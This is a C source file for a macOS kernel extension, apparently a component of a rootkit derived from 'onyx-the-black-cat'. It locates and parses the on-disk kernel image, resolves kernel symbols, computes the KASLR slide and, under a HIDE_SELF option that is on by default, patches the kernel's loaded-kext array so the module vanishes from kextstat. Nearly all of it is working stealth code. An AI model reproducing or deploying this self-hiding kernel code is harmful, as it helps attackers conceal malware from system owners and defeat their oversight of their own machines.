/*
 * Copyright (c) fG!, 2011, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Original code from "onyx-the-black-cat". Modified by Enzo Matsumiya (@enzolovesbacon).
 *
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <string.h>
#include <sys/attr.h>
#include <mach-o/nlist.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <sys/vnode.h>
#include "shared_data.h"
#include "kinfo.h"
#include "proc.h"
#include "idt.h"
#include "sysent.h"

#define HEADER_SIZE		(PAGE_SIZE_64 * 2)  /* amount of mach-o header to read */
#define LOOKUPKEXTWITHLOADTAG	"__ZN6OSKext21lookupKextWithLoadTagEj" /* OSKext::lookupKextWithLoadTag symbol - used for self hiding */

#ifndef DEBUG
#define HIDE_SELF /* hides the kext itself from kextstat */
#endif

/*
 *	Prototypes
 */
static kern_return_t get_k_mh(void *buffer, vnode_t k_vnode, struct kernel_info *kinfo);
static kern_return_t process_k_mh(void *k_header, struct kernel_info *kinfo);
static kern_return_t get_k_linkedit(vnode_t k_vnode, struct kernel_info *kinfo);
static void get_running_text_addr(struct kernel_info *kinfo);

/*
 *	Function to read necessary information from running kernel at disk, suck as KASLR slide, LINKEDIT location, etc
 *
 *	The reads from disk are implemented using the available KPI VFS functions
 */
kern_return_t init_kinfo(struct kernel_info *kinfo)
{
	/* lookup vnode for /mach_kernel */
	vnode_t k_vnode = NULLVP;
	
	if(vnode_lookup(MACH_KERNEL, 0, &k_vnode, NULL) != 0) {
		return KERN_FAILURE;
	}
	
	void *k_header = _MALLOC(HEADER_SIZE, M_TEMP, M_ZERO);
	
	if(k_header == NULL)
		goto fail;
	
	/* read and process kernel header from filesystem */
	if(get_k_mh(k_header, k_vnode, kinfo) != KERN_SUCCESS)
		goto fail;
	
	if(process_k_mh(k_header, kinfo) != KERN_SUCCESS)
		goto fail;
	
	/* compute KASLR slide */
	get_running_text_addr(kinfo);
	kinfo->kaslr_slide = kinfo->running_text_addr - kinfo->disk_text_addr;
	
	/*
	 * now we know the location of LINKEDIT and offset to symbols and their strings, now we need to read the LINKEDIT
	 * into a buffer so we can process it later
	 *
	 * __LINKEDIT total size is around 1MB
	 *
	 * we should free this buffer later when we don't need anymore to solve symbols
	 */
	kinfo->linkedit_buf = _MALLOC(kinfo->linkedit_size, M_TEMP, M_ZERO);
	
	if(kinfo->linkedit_buf == NULL) {
		_FREE(k_header, M_TEMP);
		
		return KERN_FAILURE;
	}
	
	/* read LINKEDIT from filesystem */
	if(get_k_linkedit(k_vnode, kinfo) != KERN_SUCCESS)
		goto fail;
	
#ifdef HIDE_SELF
	/* solve the OSKext::lookupKextWithLoadTag symbol */
	mach_vm_address_t loadtag_sym = solve_k_sym(kinfo, LOOKUPKEXTWITHLOADTAG);
	
	/* get sLoadedKexts offset */
	mach_vm_address_t offset = (mach_vm_address_t)((*(uint32_t *)(loadtag_sym + 0x1f)) + 0x23);
	mach_vm_address_t *sLoadedKexts = (mach_vm_address_t *)(loadtag_sym + offset);
	
	if(sLoadedKexts == 0) {
		goto fail;
	}
	
	/* get kext count */
	uint32_t *kext_countp = (uint32_t *)(*((mach_vm_address_t *)sLoadedKexts) + 0x20);
	uint32_t kext_count = *kext_countp;
	
	if(kext_count == 0) {
		goto fail;
	}
	
	/* get the real OSArray of kexts */
	mach_vm_address_t *sLoadedKexts_array = (mach_vm_address_t *)((*sLoadedKexts) + 0x18);
	
	mach_vm_address_t *ko = (mach_vm_address_t *)*sLoadedKexts_array;
	
	int i, j;
	
	for(i = 0; i < kext_count; i++) {
		kmod_info_t *kmod_info = NULL;
		mach_vm_address_t *kmodp = (mach_vm_address_t *)(ko[i] + 0x48);
		
		kmod_info = (kmod_info_t *)*kmodp;
		
		if(strncmp(kmod_info->name, BUNDLE_ID, strlen(kmod_info->name)) == 0) {
			/*
			 * now we remove the entry and adjust count of OSArray
			 *
			 * from OSArray::removeObject()
			 */
			if(i > 0) {
				kext_count--;
				
				for(j = i; j < kext_count; j++)
					ko[j] = ko[j+1];
			}
		}
	}
	
	*kext_countp = kext_count;
#endif /* HIDE_SELF */
	
success:
	_FREE(k_header, M_TEMP);
	
	/*
	 * drop the iocount due to vnode_lookup()
	 * this is necessary so the machine won't block on shutdown/reboot
	 */
	vnode_put(k_vnode);
	
	return KERN_SUCCESS;
	
fail:
	clean_kinfo(kinfo);
	vnode_put(k_vnode);
	
	return KERN_FAILURE;
}

/*
 *	Clean the kernel info buffer to avoid memory leak
 */
kern_return_t clean_kinfo(struct kernel_info *kinfo)
{
	if(kinfo->linkedit_buf != NULL)
		_FREE(kinfo->linkedit_buf, M_TEMP);
	
	return KERN_SUCCESS;
}

/*
 *	Solve a kernel symbol
 */
mach_vm_address_t solve_k_sym(struct kernel_info *kinfo, char *sym)
{
	if(kinfo == NULL || kinfo->linkedit_buf == NULL)
		return 0;
	
	/*
	 * symbols and strings offsets to LINKEDIT
	 *
	 * __LINKEDIT was just read, but fileoff values are relative to the full /mach_kernel
	 *
	 * substract the base of LINKEDIT to fix the value into our buffer
	 */
	uint64_t sym_off = kinfo->symboltable_fileoff - (kinfo->linkedit_fileoff - kinfo->fat_offset);
	
	if(sym_off > kinfo->symboltable_fileoff)
		return 0;
	
	uint64_t str_off = kinfo->stringtable_fileoff - (kinfo->linkedit_fileoff - kinfo->fat_offset);
	
	if(str_off > kinfo->stringtable_fileoff)
		return 0;
	
	/* if 32-bit */
	if(sizeof(void *) == 4) {
		struct nlist *nlist = NULL;
		
		/* search for the symbol and, if found, get its location */
		for(uint32_t i = 0; i < kinfo->symboltable_nr_symbols; i++) {
			/* get the pointer to the symbol entry and extract its symbol string */
			nlist = (struct nlist *)((char *)kinfo->linkedit_buf + sym_off + i * sizeof(struct nlist));
			char *sym_str = ((char *) kinfo->linkedit_buf + str_off + nlist->n_un.n_strx);
			
			/* check if symbol matches */
			if(strncmp(sym, sym_str, strlen(sym)) == 0) {
				/* the symbols values comes without KASLR so we need to add it */
				return (nlist->n_value + kinfo->kaslr_slide);
			}
		}
	} else if(sizeof(void *) == 8) {
		/* 64-bit */
		struct nlist_64 *nlist64 = NULL;
		
		for(uint32_t i = 0; i < kinfo->symboltable_nr_symbols; i++) {
			nlist64 = (struct nlist_64 *)((char *)kinfo->linkedit_buf + sym_off + i * sizeof(struct nlist_64));
			char *sym_str = ((char *)kinfo->linkedit_buf + str_off + nlist64->n_un.n_strx);
			
			if(strncmp(sym, sym_str, strlen(sym)) == 0) {
				return (nlist64->n_value + kinfo->kaslr_slide);
			}
		}
	}
	
	/* failed */
	return 0;
}

/*
 *	Gets the first page of kernel binary at disk into a buffer
 *	Uses KPI VFS functions and a ripped uio_createwithbuffer() from XNU
 */
static kern_return_t get_k_mh(void *buffer, vnode_t k_vnode, struct kernel_info *kinfo)
{
	uio_t uio = uio_create(1, 0, UIO_SYSSPACE, UIO_READ);
	
	if(uio == NULL) {
		return KERN_FAILURE;
	}
	
	/* imitate the kernel and read a single page from the header */
	if(uio_addiov(uio, CAST_USER_ADDR_T(buffer), HEADER_SIZE) != 0) {
		return KERN_FAILURE;
	}
	
	/* read kernel vnode into the buffer */
	if(VNOP_READ(k_vnode, uio, 0, NULL) != 0) {
		return KERN_FAILURE;
	} else if(uio_resid(uio)) {
		return KERN_FAILURE;
	}
	
	/* process the header */
	uint32_t magic = *(uint32_t *)buffer;
	
	if(magic == FAT_CIGAM) {
		struct fat_header *fh = (struct fat_header *)buffer;
		struct fat_arch *fa = (struct fat_arch *)(buffer + sizeof(struct fat_header));
		
		uint32_t file_off = 0;
		
		for(uint32_t i = 0; i  < ntohl(fh->nfat_arch); i++) {
			if(sizeof(void *) == 8 && ntohl(fa->cputype) == CPU_TYPE_X86_64) {
				file_off = ntohl(fa->offset);
				
				break;
			} else if(sizeof(void *) == 4 && ntohl(fa->cputype) == CPU_TYPE_X86) {
				file_off = ntohl(fa->offset);
				
				break;
			}
			
			fa++;
		}
		
		/* read again */
		uio = uio_create(1, file_off, UIO_SYSSPACE, UIO_READ);

		uio_addiov(uio, CAST_USER_ADDR_T(buffer), HEADER_SIZE);
		VNOP_READ(k_vnode, uio, 0, NULL);
		
		kinfo->fat_offset = file_off;
	} else {
		kinfo->fat_offset = 0;
	}
	
	return KERN_SUCCESS;
}


/*
 *	Get the whole __LINKEDIT segment into target buffer from kernel binary at disk
 *	This buffer is keeped until we don't need to solve symbols anymore
 */
static kern_return_t get_k_linkedit(vnode_t k_vnode, struct kernel_info *kinfo)
{
	uio_t uio = uio_create(1, kinfo->linkedit_fileoff, UIO_SYSSPACE, UIO_READ);
	
	if(uio == NULL) {
		return KERN_FAILURE;
	}
	
	if(uio_addiov(uio, CAST_USER_ADDR_T(kinfo->linkedit_buf), kinfo->linkedit_size) != 0) {
		return KERN_FAILURE;
	}
	
	if(VNOP_READ(k_vnode, uio, 0, NULL) != 0) {
		return KERN_FAILURE;
	} else if(uio_resid(uio)) {
		return KERN_FAILURE;
	}
	
	return KERN_SUCCESS;
}

/*
 *	Get the necessary Mach-O header information from the kernel buffer stored at out kernel_info structure
 */
static kern_return_t process_k_mh(void *k_header, struct kernel_info *kinfo)
{
	struct load_command *load_cmd = NULL;
	struct mach_header *mh = (struct mach_header *)k_header;
	size_t header_size = 0;
	int i;
	
	if(mh->magic == MH_MAGIC) {
		header_size = sizeof(struct mach_header);
	} else if(mh->magic == MH_MAGIC_64) {
		header_size = sizeof(struct mach_header_64);
	} else {
		return KERN_FAILURE;
	}
	
	/* point to the first load command */
	char *load_cmd_addr = (char *)k_header + header_size;
	
	/*
	 * iterate over all load cmds and gets required information to solve symbols
	 *
	 * __LINKEDIT location and symbol/string table location
	 */
	for(i = 0; i < mh->ncmds; i++) {
		load_cmd = (struct load_command *)load_cmd_addr;
		
		if(load_cmd->cmd == LC_SEGMENT) {
			struct segment_command *seg_cmd = (struct segment_command *)load_cmd;
			
			if(strncmp(seg_cmd->segname, "__TEXT", 16) == 0) {
				kinfo->disk_text_addr = seg_cmd->vmaddr;
				char *section_addr = load_cmd_addr + sizeof(struct segment_command);
				struct section *section_cmd = NULL;
				
				for(uint32_t x = 0; x < seg_cmd->nsects; x++) {
					section_cmd = (struct section *)section_addr;
					if(strncmp(section_cmd->sectname, "__text", 16) == 0) {
						kinfo->text_size = section_cmd->size;
						
						break;
					}
					
					section_addr += sizeof(struct section);
				}
			} else if(strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0) {
				kinfo->linkedit_fileoff = seg_cmd->fileoff;
				kinfo->linkedit_size	= seg_cmd->filesize;
			}
		} else if(load_cmd->cmd == LC_SEGMENT_64) {
			struct segment_command_64 *seg_cmd = (struct segment_command_64 *)load_cmd;
			
			/* use this one to get the original vm address of __TEXT so we can compute KASLR slide */
			if(strncmp(seg_cmd->segname, "__TEXT", 16) == 0) {
				kinfo->disk_text_addr = seg_cmd->vmaddr;
				
				/* lookup the __text section - we want the size which can be retrieved here or from the running version */
				char *section_addr = load_cmd_addr + sizeof(struct segment_command_64);
				struct section_64 *section_cmd = NULL;
				
				/* iterate through all sections */
				for(uint32_t x = 0; x < seg_cmd->nsects; x++) {
					section_cmd = (struct section_64 *)section_addr;
					
					if(strncmp(section_cmd->sectname, "__text", 16) == 0) {
						kinfo->text_size = section_cmd->size;
						
						break;
					}
					
					section_addr += sizeof(struct section_64);
				}
			} else if(strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0) {
				kinfo->linkedit_fileoff = seg_cmd->fileoff;
				kinfo->linkedit_size    = seg_cmd->filesize;
			}
		} else if(load_cmd->cmd == LC_SYMTAB) {
			struct symtab_command *symtab_cmd = (struct symtab_command *)load_cmd;
			
			kinfo->symboltable_fileoff	= symtab_cmd->symoff;
			kinfo->symboltable_nr_symbols	= symtab_cmd->nsyms;
			kinfo->stringtable_fileoff	= symtab_cmd->stroff;
			kinfo->stringtable_size		= symtab_cmd->strsize;
		}
		
		load_cmd_addr += load_cmd->cmdsize;
	}
	
	/* add the fat offset to LINKEDIT fileoffset */
	kinfo->linkedit_fileoff += kinfo->fat_offset;
	
	return KERN_SUCCESS;
}

/*
 *	Get the __TEXT address of current loaded kernel so we can compute KASLR slide
 *	(size of __text too)
 */
static void get_running_text_addr(struct kernel_info *kinfo)
{
	/* get address of IDT */
	mach_vm_address_t idt_addr = 0;
	get_idt_addr(&idt_addr);
	
	/* calculate the address of the int80 handelr */
	mach_vm_address_t int80_addr = calc_int80_addr(idt_addr);
	
	/* search backwards for the kernel base address (Mach-O header) */
	mach_vm_address_t k_base = find_kbase(int80_addr);
	
	if(k_base != 0) {
		/* get the vm address of __TEXT segment */
		struct mach_header *mh = (struct mach_header *)k_base;
		int header_size = 0;
		
		if(mh->magic == MH_MAGIC)
			header_size = sizeof(struct mach_header);
		else if(mh->magic == MH_MAGIC_64)
			header_size = sizeof(struct mach_header_64);
		
		struct load_command *load_cmd = NULL;
		char *load_cmd_addr = (char *)k_base + header_size;
		
		for(uint32_t i = 0; i< mh->ncmds; i++) {
			load_cmd = (struct load_command *)load_cmd_addr;
			
			if(load_cmd->cmd == LC_SEGMENT) {
				struct segment_command *seg_cmd = (struct segment_command *)load_cmd;
				
				if(strncmp(seg_cmd->segname, "__TEXT", 16) == 0) {
					kinfo->running_text_addr = seg_cmd->vmaddr;
					kinfo->mh = (struct mach_header_64 *)k_base;
					
					break;
				}
			} else if(load_cmd->cmd == LC_SEGMENT_64) {
				struct segment_command_64 *seg_cmd = (struct segment_command_64 *)load_cmd;
				
				if(strncmp(seg_cmd->segname, "__TEXT", 16) == 0) {
					kinfo->running_text_addr = seg_cmd->vmaddr;
					kinfo->mh = (struct mach_header_64 *)k_base;
					
					break;
				}
			}
			
			load_cmd_addr += load_cmd->cmdsize;
		}
	}
}
